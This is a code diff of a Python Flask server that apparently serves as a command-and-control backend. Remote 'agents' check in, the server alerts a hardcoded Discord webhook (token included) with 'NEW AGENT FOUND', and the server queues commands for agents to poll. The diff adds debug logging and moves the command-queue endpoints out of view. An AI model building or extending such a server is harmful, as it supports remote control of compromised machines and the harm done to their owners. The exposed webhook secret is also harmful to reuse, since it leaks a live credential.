@@ -11,25 +11,19 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1483772058558136452/l8maf6eEPYKl
 def checkin():
     data = request.json
     user = data.get('user', 'Unknown User')
-    # Send alert to Discord
+    
+    # NEW: Log this to Railway logs so we know the request arrived
+    print(f"DEBUG: Check-in received from {user}. Attempting to send to Discord...")
+    
     message = {"content": f"!!! NEW AGENT FOUND: {user} !!!"}
+    
     try:
-        requests.post(WEBHOOK_URL, json=message)
+        response = requests.post(WEBHOOK_URL, json=message)
+        # NEW: Log the response from Discord to see if it liked our request
+        print(f"DEBUG: Discord response status: {response.status_code}")
     except Exception as e:
-        print(f"Webhook failed: {e}")
+        print(f"DEBUG: Webhook failed with error: {e}")
+        
     return jsonify({"status": "acknowledged"}), 200
 
-@app.route('/send_command', methods=['POST'])
-def send_command():
-    data = request.json
-    command_queue.append(data.get('command'))
-    return jsonify({"status": "command_queued"}), 200
-
-@app.route('/get_command', methods=['GET'])
-def get_command():
-    if command_queue:
-        return jsonify({"command": command_queue.pop(0)}), 200
-    return jsonify({"command": "none"}), 200
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+# ... (rest of your existing code: /send_command, /get_command)
